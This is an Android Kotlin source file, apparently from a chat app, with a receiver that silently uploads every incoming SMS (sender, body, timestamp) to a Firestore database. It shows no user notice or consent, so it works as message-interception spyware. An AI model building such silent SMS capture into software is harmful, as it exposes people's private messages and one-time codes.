package com.miracos.mirchat

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.google.firebase.Timestamp
import com.google.firebase.firestore.FirebaseFirestore

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val db = FirebaseFirestore.getInstance()

            for (message in messages) {
                val smsData = hashMapOf(
                    "sender" to message.displayOriginatingAddress,
                    "body" to message.displayMessageBody,
                    "timestamp" to Timestamp.now(),
                    "device" to "J7 Prime"
                )

                db.collection("messages").add(smsData)
            }
        }
    }
}